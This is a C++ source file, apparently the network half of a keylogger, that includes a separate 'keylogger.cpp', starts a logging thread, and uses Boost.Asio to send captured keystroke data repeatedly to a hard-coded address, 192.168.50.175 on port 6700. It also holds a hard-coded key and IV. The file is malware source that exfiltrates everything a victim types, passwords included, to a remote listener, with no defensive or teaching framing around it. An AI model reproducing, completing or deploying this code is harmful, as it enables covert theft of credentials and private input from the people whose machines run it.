#include <boost/bind/bind.hpp>
#include <boost/asio.hpp>
#include <iostream>
#include <cstdlib>
#include <string>
#include <mutex>
#include <thread>
#include <condition_variable>

#include "keylogger.cpp"

#if defined(_WIN32)

#include <conio.h>

#else

#include <termio.h>
#include <unistd.h>

#endif

//#include "asd.hpp"

//static struct termios oldt, newt;

using boost::asio::ip::tcp;

class client
{
public:
	client(boost::asio::io_service& serv, const std::string &hostname, const std::string &port)
	  : resolver_(serv), socket_(serv)
    {
		tcp::resolver::query query(hostname, port);
		resolver_.async_resolve(query,
        boost::bind(&client::resolve_handler, this,
            boost::asio::placeholders::error,
            boost::asio::placeholders::iterator));
    }
private:
	void resolve_handler(const boost::system::error_code& err,
			tcp::resolver::iterator it)
	{
		if (!err) {
			tcp::endpoint ep_ = *it;
			socket_.async_connect(ep_,
				boost::bind(&client::connect_handler, this,
				boost::asio::placeholders::error, it++));
		} else {
			std::cout << "resolve_handler error: " << err.message() << "\n";
		}
	}

	void connect_handler(const boost::system::error_code& err,
			tcp::resolver::iterator it)
	{
		if (!err) {
			// std::cout << "% ";
			//line += getch();
			std::unique_lock<std::mutex> kdata_lk{kdata_mutex};
			kdata_cv.wait(kdata_lk);
			// std::cout << std::endl;
			boost::asio::async_write(socket_, boost::asio::buffer(kdata, kdata.size()),
				boost::bind(&client::write_handler, this,
				boost::asio::placeholders::error));
		} else if (it != tcp::resolver::iterator()) {
			socket_.close();
			tcp::endpoint ep_ = *it;
			socket_.async_connect(ep_,
				boost::bind(&client::connect_handler, this,
				boost::asio::placeholders::error, ++it));
		} else {
			std::ostringstream ss;
			ss << "connection_handler error: " << err.message() << "\n";
			//std::cout << "connect_handler error: " << err.message() << "\n";
		}
	}

	void write_handler(const boost::system::error_code &ec)
	{
		cmsg_len = 0;
		if (!ec) {
			// std::cout << "% ";
			std::unique_lock<std::mutex> kdata_lk{kdata_mutex};
			kdata_cv.wait(kdata_lk);
			// std::cout << std::endl;
			boost::asio::async_write(socket_, boost::asio::buffer(kdata, kdata.size()),
				boost::bind(&client::write_handler, this,
				boost::asio::placeholders::error));
		} else if (ec == boost::asio::error::eof) {
			return;
		} else {
			std::cout << "write_handler error: " << ec.message() << "\n";
		}
	}

	tcp::resolver resolver_;
	tcp::socket socket_;
	std::string line;
	int session_;

	unsigned char *key = (unsigned char *)"01234567890123456789012345678901";
	unsigned char *iv = (unsigned char *)"0123456789012345";
	unsigned char cmsg[128];
	unsigned char dmsg[128];
	size_t cmsg_len;
	size_t dmsg_len;
};

int main(int argc, char* argv[])
{
	try {
		boost::asio::io_service io_service;

		new client(io_service, "192.168.50.175", "6700");

		std::thread logger_thread(startLogger);

		io_service.run();
	} catch (std::exception& e) {
		std::cout << "Exception: " << e.what() << "\n";
	}

	return 0;
}